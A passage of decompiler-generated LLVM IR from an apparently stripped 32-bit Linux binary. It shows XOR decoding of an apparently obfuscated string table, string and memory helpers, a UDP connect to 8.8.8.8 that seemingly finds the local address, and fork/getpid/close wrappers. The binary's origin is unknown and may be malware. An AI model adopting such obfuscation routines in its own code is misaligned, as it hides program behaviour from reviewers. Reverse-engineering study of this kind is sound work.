  store i8 %v5_804f70e, i8* %stack_var_-44, align 1
  %v2_804f711 = udiv i32 %v1_804f6f4, 65536
  store i32 %v2_804f711, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f714

dec_label_pc_804f714:                             ; preds = %dec_label_pc_804f714.dec_label_pc_804f714_crit_edge, %dec_label_pc_804f700
  %v0_804f71a = phi i32 [ %v0_804f71a.pre, %dec_label_pc_804f714.dec_label_pc_804f714_crit_edge ], [ %v1_804f6f4, %dec_label_pc_804f700 ]
  %v0_804f716 = phi i32 [ %v1_804f746, %dec_label_pc_804f714.dec_label_pc_804f714_crit_edge ], [ 0, %dec_label_pc_804f700 ]
  %v0_804f714 = phi i32 [ %v0_804f73e, %dec_label_pc_804f714.dec_label_pc_804f714_crit_edge ], [ %v2_804f6ed, %dec_label_pc_804f700 ]
  %v1_804f714 = inttoptr i32 %v0_804f714 to i32*
  %v2_804f714 = load i32, i32* %v1_804f714, align 4
  %v2_804f718 = add i32 %v2_804f714, %v0_804f716
  %v1_804f71c = inttoptr i32 %v2_804f718 to i8*
  %v2_804f71c = load i8, i8* %v1_804f71c, align 1
  %v4_804f71c = trunc i32 %v0_804f71a to i8
  %v5_804f71c = xor i8 %v2_804f71c, %v4_804f71c
  store i8 %v5_804f71c, i8* %v1_804f71c, align 1
  %v0_804f71e = load i32, i32* %edx.global-to-local, align 4
  %v0_804f720 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f720 = inttoptr i32 %v0_804f720 to i32*
  %v2_804f720 = load i32, i32* %v1_804f720, align 4
  %v2_804f722 = add i32 %v2_804f720, %v0_804f71e
  %v0_804f724 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f726 = inttoptr i32 %v2_804f722 to i8*
  %v2_804f726 = load i8, i8* %v1_804f726, align 1
  %v4_804f726 = trunc i32 %v0_804f724 to i8
  %v5_804f726 = xor i8 %v2_804f726, %v4_804f726
  store i8 %v5_804f726, i8* %v1_804f726, align 1
  %v0_804f728 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f72a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f72a = inttoptr i32 %v0_804f72a to i32*
  %v2_804f72a = load i32, i32* %v1_804f72a, align 4
  %v2_804f72c = add i32 %v2_804f72a, %v0_804f728
  %v0_804f72e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f730 = inttoptr i32 %v2_804f72c to i8*
  %v2_804f730 = load i8, i8* %v1_804f730, align 1
  %v4_804f730 = trunc i32 %v0_804f72e to i8
  %v5_804f730 = xor i8 %v2_804f730, %v4_804f730
  store i8 %v5_804f730, i8* %v1_804f730, align 1
  %v0_804f732 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f734 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f734 = inttoptr i32 %v0_804f734 to i32*
  %v2_804f734 = load i32, i32* %v1_804f734, align 4
  %v1_804f736 = add i32 %v0_804f732, 1
  store i32 %v1_804f736, i32* %edx.global-to-local, align 4
  %v2_804f737 = add i32 %v2_804f734, %v0_804f732
  %v2_804f739 = load i8, i8* %stack_var_-44, align 1
  %v1_804f73c = inttoptr i32 %v2_804f737 to i8*
  %v2_804f73c = load i8, i8* %v1_804f73c, align 1
  %v5_804f73c = xor i8 %v2_804f73c, %v2_804f739
  store i8 %v5_804f73c, i8* %v1_804f73c, align 1
  %v0_804f73e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f73e = add i32 %v0_804f73e, 4
  %v2_804f73e = inttoptr i32 %v1_804f73e to i32*
  %v3_804f73e = load i32, i32* %v2_804f73e, align 4
  %v1_804f741 = urem i32 %v3_804f73e, 65536
  %v1_804f746 = load i32, i32* %edx.global-to-local, align 4
  %v8_804f748 = icmp sgt i32 %v1_804f741, %v1_804f746
  br i1 %v8_804f748, label %dec_label_pc_804f714.dec_label_pc_804f714_crit_edge, label %dec_label_pc_804f74a

dec_label_pc_804f714.dec_label_pc_804f714_crit_edge: ; preds = %dec_label_pc_804f714
  %v0_804f71a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f714

dec_label_pc_804f74a:                             ; preds = %dec_label_pc_804f714, %dec_label_pc_804f6e0
  %v0_804f751 = phi i32 [ %v1_804f6f4, %dec_label_pc_804f6e0 ], [ %v1_804f741, %dec_label_pc_804f714 ]
  ret i32 %v0_804f751

; uselistorder directives
  uselistorder i32 %v1_804f746, { 1, 0 }
  uselistorder i32 %v1_804f741, { 1, 0 }
  uselistorder i32 %v0_804f73e, { 1, 0 }
  uselistorder i32 %v1_804f6f4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_804f760() local_unnamed_addr {
dec_label_pc_804f760:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f769 = zext i8 %tmp to i32
  %v1_804f76d = mul nuw nsw i32 %v4_804f769, 8
  %v2_804f76d = add i32 %v1_804f76d, ptrtoint (i32* @global_var_8054460.28 to i32)
  store i32 %v2_804f76d, i32* %ecx.global-to-local, align 4
  %v0_804f774 = load i16, i16* @global_var_80542fc.29, align 2
  %v1_804f774 = sext i16 %v0_804f774 to i32
  %v1_804f779 = add i32 %v1_804f76d, add (i32 ptrtoint (i32* @global_var_8054460.28 to i32), i32 4)
  %v2_804f779 = inttoptr i32 %v1_804f779 to i16*
  %v3_804f779 = load i16, i16* %v2_804f779, align 4
  %v4_804f779 = icmp eq i16 %v3_804f779, 0
  br i1 %v4_804f779, label %dec_label_pc_804f7ca, label %dec_label_pc_804f780

dec_label_pc_804f780:                             ; preds = %dec_label_pc_804f760
  store i32 %v1_804f774, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804f788 = udiv i32 %v1_804f774, 16777216
  %v2_804f78b = udiv i32 %v1_804f774, 256
  store i32 %v2_804f78b, i32* %edi.global-to-local, align 4
  %v5_804f78e = trunc i32 %v2_804f788 to i8
  store i8 %v5_804f78e, i8* %stack_var_-44, align 1
  %v2_804f791 = udiv i32 %v1_804f774, 65536
  store i32 %v2_804f791, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f794

dec_label_pc_804f794:                             ; preds = %dec_label_pc_804f794.dec_label_pc_804f794_crit_edge, %dec_label_pc_804f780
  %v0_804f79a = phi i32 [ %v0_804f79a.pre, %dec_label_pc_804f794.dec_label_pc_804f794_crit_edge ], [ %v1_804f774, %dec_label_pc_804f780 ]
  %v0_804f796 = phi i32 [ %v1_804f7c6, %dec_label_pc_804f794.dec_label_pc_804f794_crit_edge ], [ 0, %dec_label_pc_804f780 ]
  %v0_804f794 = phi i32 [ %v0_804f7be, %dec_label_pc_804f794.dec_label_pc_804f794_crit_edge ], [ %v2_804f76d, %dec_label_pc_804f780 ]
  %v1_804f794 = inttoptr i32 %v0_804f794 to i32*
  %v2_804f794 = load i32, i32* %v1_804f794, align 4
  %v2_804f798 = add i32 %v2_804f794, %v0_804f796
  %v1_804f79c = inttoptr i32 %v2_804f798 to i8*
  %v2_804f79c = load i8, i8* %v1_804f79c, align 1
  %v4_804f79c = trunc i32 %v0_804f79a to i8
  %v5_804f79c = xor i8 %v2_804f79c, %v4_804f79c
  store i8 %v5_804f79c, i8* %v1_804f79c, align 1
  %v0_804f79e = load i32, i32* %edx.global-to-local, align 4
  %v0_804f7a0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f7a0 = inttoptr i32 %v0_804f7a0 to i32*
  %v2_804f7a0 = load i32, i32* %v1_804f7a0, align 4
  %v2_804f7a2 = add i32 %v2_804f7a0, %v0_804f79e
  %v0_804f7a4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7a6 = inttoptr i32 %v2_804f7a2 to i8*
  %v2_804f7a6 = load i8, i8* %v1_804f7a6, align 1
  %v4_804f7a6 = trunc i32 %v0_804f7a4 to i8
  %v5_804f7a6 = xor i8 %v2_804f7a6, %v4_804f7a6
  store i8 %v5_804f7a6, i8* %v1_804f7a6, align 1
  %v0_804f7a8 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f7aa = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f7aa = inttoptr i32 %v0_804f7aa to i32*
  %v2_804f7aa = load i32, i32* %v1_804f7aa, align 4
  %v2_804f7ac = add i32 %v2_804f7aa, %v0_804f7a8
  %v0_804f7ae = load i32, i32* %esi.global-to-local, align 4
  %v1_804f7b0 = inttoptr i32 %v2_804f7ac to i8*
  %v2_804f7b0 = load i8, i8* %v1_804f7b0, align 1
  %v4_804f7b0 = trunc i32 %v0_804f7ae to i8
  %v5_804f7b0 = xor i8 %v2_804f7b0, %v4_804f7b0
  store i8 %v5_804f7b0, i8* %v1_804f7b0, align 1
  %v0_804f7b2 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f7b4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f7b4 = inttoptr i32 %v0_804f7b4 to i32*
  %v2_804f7b4 = load i32, i32* %v1_804f7b4, align 4
  %v1_804f7b6 = add i32 %v0_804f7b2, 1
  store i32 %v1_804f7b6, i32* %edx.global-to-local, align 4
  %v2_804f7b7 = add i32 %v2_804f7b4, %v0_804f7b2
  %v2_804f7b9 = load i8, i8* %stack_var_-44, align 1
  %v1_804f7bc = inttoptr i32 %v2_804f7b7 to i8*
  %v2_804f7bc = load i8, i8* %v1_804f7bc, align 1
  %v5_804f7bc = xor i8 %v2_804f7bc, %v2_804f7b9
  store i8 %v5_804f7bc, i8* %v1_804f7bc, align 1
  %v0_804f7be = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f7be = add i32 %v0_804f7be, 4
  %v2_804f7be = inttoptr i32 %v1_804f7be to i32*
  %v3_804f7be = load i32, i32* %v2_804f7be, align 4
  %v1_804f7c1 = urem i32 %v3_804f7be, 65536
  %v1_804f7c6 = load i32, i32* %edx.global-to-local, align 4
  %v8_804f7c8 = icmp sgt i32 %v1_804f7c1, %v1_804f7c6
  br i1 %v8_804f7c8, label %dec_label_pc_804f794.dec_label_pc_804f794_crit_edge, label %dec_label_pc_804f7ca

dec_label_pc_804f794.dec_label_pc_804f794_crit_edge: ; preds = %dec_label_pc_804f794
  %v0_804f79a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f794

dec_label_pc_804f7ca:                             ; preds = %dec_label_pc_804f794, %dec_label_pc_804f760
  %v0_804f7d1 = phi i32 [ %v1_804f774, %dec_label_pc_804f760 ], [ %v1_804f7c1, %dec_label_pc_804f794 ]
  ret i32 %v0_804f7d1

; uselistorder directives
  uselistorder i32 %v1_804f7c6, { 1, 0 }
  uselistorder i32 %v1_804f7c1, { 1, 0 }
  uselistorder i32 %v0_804f7be, { 1, 0 }
  uselistorder i32 %v1_804f774, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8054460.28 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_80542fc.29, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8054460.28 to i32), { 1, 2, 3, 0 }
}

define i32 @function_804fd30(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fd30:
  %v4_804fd30 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fd30, i32* @edx, align 4
  %v2_804fd36 = load i8, i8* %arg1, align 1
  %v3_804fd36 = icmp eq i8 %v2_804fd36, 0
  br i1 %v3_804fd36, label %dec_label_pc_804fd47, label %dec_label_pc_804fd40

dec_label_pc_804fd40:                             ; preds = %dec_label_pc_804fd30, %dec_label_pc_804fd40
  %v0_804fd40 = phi i32 [ %v1_804fd40, %dec_label_pc_804fd40 ], [ 0, %dec_label_pc_804fd30 ]
  %v1_804fd40 = add i32 %v0_804fd40, 1
  %v2_804fd41 = add i32 %v1_804fd40, %v4_804fd30
  %v3_804fd41 = inttoptr i32 %v2_804fd41 to i8*
  %v4_804fd41 = load i8, i8* %v3_804fd41, align 1
  %v5_804fd41 = icmp eq i8 %v4_804fd41, 0
  %v1_804fd45 = icmp eq i1 %v5_804fd41, false
  br i1 %v1_804fd45, label %dec_label_pc_804fd40, label %dec_label_pc_804fd47

dec_label_pc_804fd47:                             ; preds = %dec_label_pc_804fd40, %dec_label_pc_804fd30
  %v0_804fd47 = phi i32 [ 0, %dec_label_pc_804fd30 ], [ %v1_804fd40, %dec_label_pc_804fd40 ]
  ret i32 %v0_804fd47

; uselistorder directives
  uselistorder label %dec_label_pc_804fd40, { 1, 0 }
}

define i32 @function_804fdc0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fdc0:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804fdc8 = icmp eq i32 %arg2, 0
  br i1 %v1_804fdc8, label %dec_label_pc_804fdc0.dec_label_pc_804fdd9_crit_edge, label %dec_label_pc_804fdcc

dec_label_pc_804fdc0.dec_label_pc_804fdd9_crit_edge: ; preds = %dec_label_pc_804fdc0
  %v0_804fdd9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804fdd9

dec_label_pc_804fdcc:                             ; preds = %dec_label_pc_804fdc0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804fdd05 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_804fdd05, align 1
  %v0_804fdd46 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdd47 = add i32 %v0_804fdd46, 1
  store i32 %v1_804fdd47, i32* %eax.global-to-local, align 4
  %v12_804fdd58 = icmp eq i32 %v1_804fdd47, %arg2
  %v1_804fdd79 = icmp eq i1 %v12_804fdd58, false
  br i1 %v1_804fdd79, label %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge, label %dec_label_pc_804fdd9

dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge: ; preds = %dec_label_pc_804fdcc, %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge
  %v1_804fdd410 = phi i32 [ %v1_804fdd4, %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge ], [ %v1_804fdd47, %dec_label_pc_804fdcc ]
  %v1_804fdd0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fdd0 = add i32 %v1_804fdd410, %v1_804fdd0.pre
  %v3_804fdd0 = inttoptr i32 %v2_804fdd0 to i8*
  store i8 0, i8* %v3_804fdd0, align 1
  %v0_804fdd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdd4 = add i32 %v0_804fdd4, 1
  store i32 %v1_804fdd4, i32* %eax.global-to-local, align 4
  %v12_804fdd5 = icmp eq i32 %v1_804fdd4, %arg2
  %v1_804fdd7 = icmp eq i1 %v12_804fdd5, false
  br i1 %v1_804fdd7, label %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge, label %dec_label_pc_804fdd9

dec_label_pc_804fdd9:                             ; preds = %dec_label_pc_804fdcc, %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge, %dec_label_pc_804fdc0.dec_label_pc_804fdd9_crit_edge
  %v0_804fdd9 = phi i32 [ %v0_804fdd9.pre, %dec_label_pc_804fdc0.dec_label_pc_804fdd9_crit_edge ], [ %v1_804fdd47, %dec_label_pc_804fdcc ], [ %v1_804fdd4, %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge ]
  ret i32 %v0_804fdd9

; uselistorder directives
  uselistorder i32 %v1_804fdd4, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdd9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdd0.dec_label_pc_804fdd0_crit_edge, { 1, 0 }
}

define i32 @function_804fde0() local_unnamed_addr {
dec_label_pc_804fde0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_804fdf5 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_804fdf5, %tmp17
  br i1 %or.cond, label %dec_label_pc_804fdfa, label %dec_label_pc_804fe04

dec_label_pc_804fdfa:                             ; preds = %dec_label_pc_804fe12, %dec_label_pc_804fe25, %dec_label_pc_804fde0
  %storemerge = phi i32 [ -1, %dec_label_pc_804fde0 ], [ -1, %dec_label_pc_804fe12 ], [ %v0_804fe13, %dec_label_pc_804fe25 ]
  ret i32 %storemerge

dec_label_pc_804fe04:                             ; preds = %dec_label_pc_804fde0
  %v2_804fe1c = add i32 %tmp, -1
  br label %dec_label_pc_804fe18

dec_label_pc_804fe10:                             ; preds = %dec_label_pc_804fe18
  br label %dec_label_pc_804fe12

dec_label_pc_804fe12:                             ; preds = %dec_label_pc_804fe25, %dec_label_pc_804fe10
  %v2_804fe203 = phi i32 [ %v1_804fe25, %dec_label_pc_804fe25 ], [ 0, %dec_label_pc_804fe10 ]
  %v1_804fe12 = add i32 %v0_804fe12, 1
  %v1_804fe13 = add i32 %v0_804fe13, 1
  %v12_804fe14 = icmp eq i32 %tmp10, %v1_804fe12
  br i1 %v12_804fe14, label %dec_label_pc_804fdfa, label %dec_label_pc_804fe18

dec_label_pc_804fe18:                             ; preds = %dec_label_pc_804fe12, %dec_label_pc_804fe04
  %v0_804fe12 = phi i32 [ %v1_804fe12, %dec_label_pc_804fe12 ], [ 0, %dec_label_pc_804fe04 ]
  %v0_804fe25 = phi i32 [ %v2_804fe203, %dec_label_pc_804fe12 ], [ 0, %dec_label_pc_804fe04 ]
  %v0_804fe13 = phi i32 [ %v1_804fe13, %dec_label_pc_804fe12 ], [ 1, %dec_label_pc_804fe04 ]
  %v3_804fe1c = add i32 %v2_804fe1c, %v0_804fe13
  %v4_804fe1c = inttoptr i32 %v3_804fe1c to i8*
  %v5_804fe1c = load i8, i8* %v4_804fe1c, align 1
  %v4_804fe20 = add i32 %v0_804fe25, %tmp8
  %v5_804fe20 = inttoptr i32 %v4_804fe20 to i8*
  %v6_804fe20 = load i8, i8* %v5_804fe20, align 1
  %v17_804fe20 = icmp eq i8 %v5_804fe1c, %v6_804fe20
  %v1_804fe23 = icmp eq i1 %v17_804fe20, false
  br i1 %v1_804fe23, label %dec_label_pc_804fe10, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe18
  %v1_804fe25 = add i32 %v0_804fe25, 1
  %v12_804fe26 = icmp eq i32 %tmp9, %v1_804fe25
  %v1_804fe28 = icmp eq i1 %v12_804fe26, false
  br i1 %v1_804fe28, label %dec_label_pc_804fe12, label %dec_label_pc_804fdfa

; uselistorder directives
  uselistorder i32 %v0_804fe13, { 2, 0, 1 }
  uselistorder i32 %v0_804fe25, { 1, 0 }
  uselistorder i32 %v1_804fe12, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdfa, { 1, 0, 2 }
}

define i32 @function_804ffa0() local_unnamed_addr {
dec_label_pc_804ffa0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_804ffad = call i32 @function_805078b(i32 16)
  %v1_804ffb2 = inttoptr i32 %v1_804ffad to i32*
  store i32 0, i32* %v1_804ffb2, align 4
  %v4_804ffbf = call i32 @function_8050a37(i32 2, i32 2, i32 0, i32 %v1_804ffad)
  store i32 %v4_804ffbf, i32* %esi.global-to-local, align 4
  %v10_804ffcb = icmp eq i32 %v4_804ffbf, -1
  br i1 %v10_804ffcb, label %dec_label_pc_8050012, label %dec_label_pc_804ffd0

dec_label_pc_804ffd0:                             ; preds = %dec_label_pc_804ffa0
  %v2_804ffd0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ffd0, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804ffef = call i32 @function_805085c(i32 %v4_804ffbf, i32 %v2_804ffd0, i32 16)
  %v2_804fff7 = ptrtoint i32* %stack_var_-12 to i32
  %v0_804fffd = load i32, i32* %esi.global-to-local, align 4
  %v3_804fffe = call i32 @function_8050887(i32 %v0_804fffd, i32 %v2_804ffd0, i32 %v2_804fff7)
  %v1_8050006 = call i32 @function_8050253(i32 %v0_804fffd)
  br label %dec_label_pc_8050012

dec_label_pc_8050012:                             ; preds = %dec_label_pc_804ffa0, %dec_label_pc_804ffd0
  %v0_8050017 = phi i32 [ 0, %dec_label_pc_804ffa0 ], [ 134744072, %dec_label_pc_804ffd0 ]
  ret i32 %v0_8050017

; uselistorder directives
  uselistorder i32 %v4_804ffbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805085c, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050a37, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8050012, { 1, 0 }
}

define i32 @function_80501bd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80501bd:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80501bd = load i32, i32* @edi, align 4
  %v0_80501be = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80501d2 = add i32 %arg2, -12
  %v6_80501dc = icmp ugt i32 %v1_80501d2, 2
  br i1 %v6_80501dc, label %dec_label_pc_80501ec, label %dec_label_pc_80501de

dec_label_pc_80501de:                             ; preds = %dec_label_pc_80501bd
  %v4_80501e2 = call i32 @function_8050214(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80501d2)
  br label %dec_label_pc_805020e

dec_label_pc_80501ec:                             ; preds = %dec_label_pc_80501bd
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80501f4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_80501f4, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_80501f4, -4095
  br i1 %tmp17, label %dec_label_pc_805020c, label %dec_label_pc_8050200

dec_label_pc_8050200:                             ; preds = %dec_label_pc_80501ec
  %v1_8050200 = call i32 @function_805078b(i32 %v0_80501be)
  %v0_8050205 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050205 = sub i32 0, %v0_8050205
  %v2_8050207 = inttoptr i32 %v1_8050200 to i32*
  store i32 %v1_8050205, i32* %v2_8050207, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_80501ec, %dec_label_pc_8050200
  %v0_805020c = phi i32 [ %v2_80501f4, %dec_label_pc_80501ec ], [ -1, %dec_label_pc_8050200 ]
  br label %dec_label_pc_805020e

dec_label_pc_805020e:                             ; preds = %dec_label_pc_80501de, %dec_label_pc_805020c
  %v0_8050213 = phi i32 [ %v4_80501e2, %dec_label_pc_80501de ], [ %v0_805020c, %dec_label_pc_805020c ]
  store i32 %v0_80501be, i32* @ebx, align 4
  store i32 %v0_80501bd, i32* @edi, align 4
  ret i32 %v0_8050213

; uselistorder directives
  uselistorder i32 %v2_80501f4, { 1, 0, 2 }
  uselistorder i32 %v0_80501be, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805020e, { 1, 0 }
  uselistorder label %dec_label_pc_805020c, { 1, 0 }
}

define i32 @function_8050214(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050214:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050214 = load i32, i32* @edi, align 4
  store i32 %v0_8050214, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805022c = load i32, i32* @ebx, align 4
  %v1_8050234 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8050234, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8050234, -4095
  br i1 %tmp12, label %dec_label_pc_805024c, label %dec_label_pc_8050240

dec_label_pc_8050240:                             ; preds = %dec_label_pc_8050214
  %v1_8050240 = call i32 @function_805078b(i32 %v0_805022c)
  %v0_8050245 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050245 = sub i32 0, %v0_8050245
  %v2_8050247 = inttoptr i32 %v1_8050240 to i32*
  store i32 %v1_8050245, i32* %v2_8050247, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050251.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805024c

dec_label_pc_805024c:                             ; preds = %dec_label_pc_8050214, %dec_label_pc_8050240
  %v2_8050251 = phi i32 [ %v0_8050214, %dec_label_pc_8050214 ], [ %v2_8050251.pre, %dec_label_pc_8050240 ]
  %v0_805024c = phi i32 [ %v1_8050234, %dec_label_pc_8050214 ], [ -1, %dec_label_pc_8050240 ]
  store i32 %v2_8050251, i32* %edi.global-to-local, align 4
  ret i32 %v0_805024c

; uselistorder directives
  uselistorder i32 %v1_8050234, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805024c, { 1, 0 }
}

define i32 @function_8050253(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050253:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050253 = load i32, i32* @edi, align 4
  store i32 %v0_8050253, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805025b = load i32, i32* @ebx, align 4
  %v1_8050263 = call i32 @close(i32 %arg1)
  store i32 %v0_805025b, i32* @ebx, align 4
  store i32 %v1_8050263, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8050263, -4095
  br i1 %tmp9, label %dec_label_pc_805027b, label %dec_label_pc_805026f

dec_label_pc_805026f:                             ; preds = %dec_label_pc_8050253
  %v1_805026f = call i32 @function_805078b(i32 %v0_805025b)
  %v0_8050274 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050274 = sub i32 0, %v0_8050274
  %v2_8050276 = inttoptr i32 %v1_805026f to i32*
  store i32 %v1_8050274, i32* %v2_8050276, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805027f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805027b

dec_label_pc_805027b:                             ; preds = %dec_label_pc_8050253, %dec_label_pc_805026f
  %v2_805027f = phi i32 [ %v0_8050253, %dec_label_pc_8050253 ], [ %v2_805027f.pre, %dec_label_pc_805026f ]
  %v0_805027b = phi i32 [ %v1_8050263, %dec_label_pc_8050253 ], [ -1, %dec_label_pc_805026f ]
  store i32 %v2_805027f, i32* @edi, align 4
  ret i32 %v0_805027b

; uselistorder directives
  uselistorder i32 %v1_8050263, { 1, 0, 2 }
  uselistorder i32 %v0_805025b, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805027b, { 1, 0 }
}

define i32 @function_8050281() local_unnamed_addr {
dec_label_pc_8050281:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050281 = load i32, i32* @ebx, align 4
  store i32 %v0_8050281, i32* %stack_var_-4, align 4
  %v1_805028a = call i32 @fork(i32 %v0_8050281)
  store i32 %v1_805028a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805028a, -4095
  br i1 %tmp7, label %dec_label_pc_80502a1, label %dec_label_pc_8050295

dec_label_pc_8050295:                             ; preds = %dec_label_pc_8050281
  %v1_8050295 = call i32 @function_805078b(i32 %v0_8050281)
  %v0_805029a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805029a = sub i32 0, %v0_805029a
  %v2_805029c = inttoptr i32 %v1_8050295 to i32*
  store i32 %v1_805029a, i32* %v2_805029c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80502a5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502a1

dec_label_pc_80502a1:                             ; preds = %dec_label_pc_8050281, %dec_label_pc_8050295
  %v2_80502a5 = phi i32 [ %v0_8050281, %dec_label_pc_8050281 ], [ %v2_80502a5.pre, %dec_label_pc_8050295 ]
  %v0_80502a1 = phi i32 [ %v1_805028a, %dec_label_pc_8050281 ], [ -1, %dec_label_pc_8050295 ]
  store i32 %v2_80502a5, i32* @ebx, align 4
  ret i32 %v0_80502a1

; uselistorder directives
  uselistorder i32 %v1_805028a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502a1, { 1, 0 }
}

define i32 @function_80502a7() local_unnamed_addr {
dec_label_pc_80502a7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80502a7, i32* %stack_var_-4, align 4
  %v1_80502b0 = call i32 @getpid(i32 %v0_80502a7)
  store i32 %v1_80502b0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80502b0, -4095
